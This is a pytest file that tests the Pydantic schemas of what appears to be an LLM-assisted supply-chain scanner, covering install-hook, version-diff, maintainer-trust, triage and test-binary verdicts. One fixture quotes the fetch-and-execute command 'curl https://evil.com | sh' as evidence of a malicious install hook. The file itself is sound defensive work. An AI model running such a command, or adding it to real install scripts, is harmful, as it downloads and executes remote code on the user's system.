"""Tests for LLM stage Pydantic schemas."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from packages.sca.llm.schemas import (
    BinaryInTestsVerdict,
    DiffAnomaly,
    InstallHookVerdict,
    MaintainerTrustVerdict,
    TriageItem,
    TriageResult,
    VersionDiffVerdict,
)


class TestInstallHookVerdict:
    def test_valid_benign(self):
        v = InstallHookVerdict(verdict="benign", confidence="high")
        assert v.verdict == "benign"
        assert v.behaviours == []
        assert v.evidence_quotes == []

    def test_valid_malicious_with_behaviours(self):
        v = InstallHookVerdict(
            verdict="malicious",
            confidence="high",
            behaviours=["outbound_network", "credential_read"],
            evidence_quotes=["curl https://evil.com | sh"],
            reasoning="Downloads and executes remote payload",
        )
        assert len(v.behaviours) == 2
        assert v.reasoning.startswith("Downloads")

    def test_invalid_verdict_rejected(self):
        with pytest.raises(ValidationError):
            InstallHookVerdict(verdict="safe", confidence="high")

    def test_invalid_behaviour_rejected(self):
        with pytest.raises(ValidationError):
            InstallHookVerdict(
                verdict="benign", confidence="high",
                behaviours=["not_a_real_behaviour"],
            )

    def test_reasoning_max_length(self):
        v = InstallHookVerdict(
            verdict="benign", confidence="low",
            reasoning="x" * 500,
        )
        assert len(v.reasoning) == 500


class TestVersionDiffVerdict:
    def test_valid_clean(self):
        v = VersionDiffVerdict(
            verdict="clean", confidence="high",
            changelog_consistent=True,
        )
        assert v.anomalies == []

    def test_with_anomaly(self):
        v = VersionDiffVerdict(
            verdict="suspicious", confidence="medium",
            changelog_consistent=False,
            anomalies=[DiffAnomaly(
                file_path="src/hook.js",
                description="Added eval() call",
                severity="suspicious",
            )],
            behaviours=["obfuscated_code_added"],
        )
        assert len(v.anomalies) == 1
        assert v.anomalies[0].severity == "suspicious"

    def test_invalid_verdict_rejected(self):
        with pytest.raises(ValidationError):
            VersionDiffVerdict(
                verdict="good", confidence="high",
                changelog_consistent=True,
            )


class TestMaintainerTrustVerdict:
    def test_valid(self):
        v = MaintainerTrustVerdict(
            trust_level="medium",
            confidence="high",
            concerns=["Single maintainer", "No 2FA"],
            summary="Medium trust. Single maintainer with no 2FA. "
                    "Monitor for unusual activity.",
        )
        assert len(v.concerns) == 2

    def test_invalid_trust_level_rejected(self):
        with pytest.raises(ValidationError):
            MaintainerTrustVerdict(
                trust_level="very_high", confidence="low",
            )


class TestTriageResult:
    def test_valid(self):
        r = TriageResult(
            items=[
                TriageItem(
                    finding_id="F-001",
                    priority_bucket="fix_today",
                    one_line_rationale="KEV + critical severity",
                ),
                TriageItem(
                    finding_id="F-002",
                    priority_bucket="accept",
                    one_line_rationale="Dev-only, info severity",
                ),
            ],
            project_context_summary="Web app with public API surface",
        )
        assert len(r.items) == 2
        assert r.items[0].priority_bucket == "fix_today"

    def test_empty_items(self):
        r = TriageResult(items=[])
        assert r.items == []

    def test_invalid_bucket_rejected(self):
        with pytest.raises(ValidationError):
            TriageItem(
                finding_id="F-001",
                priority_bucket="urgent",
                one_line_rationale="test",
            )


class TestBinaryInTestsVerdict:
    def test_valid_benign(self):
        v = BinaryInTestsVerdict(
            verdict="benign", confidence="high",
            referenced_in_tests=True,
            reasoning="Binary is a PNG fixture loaded by test_render.py",
        )
        assert v.verdict == "benign"
        assert v.referenced_in_tests is True

    def test_valid_suspicious(self):
        v = BinaryInTestsVerdict(
            verdict="suspicious", confidence="medium",
            referenced_in_tests=False,
            reasoning="No test code references this 5MB ELF binary",
        )
        assert v.referenced_in_tests is False

    def test_invalid_verdict_rejected(self):
        with pytest.raises(ValidationError):
            BinaryInTestsVerdict(verdict="safe", confidence="high")
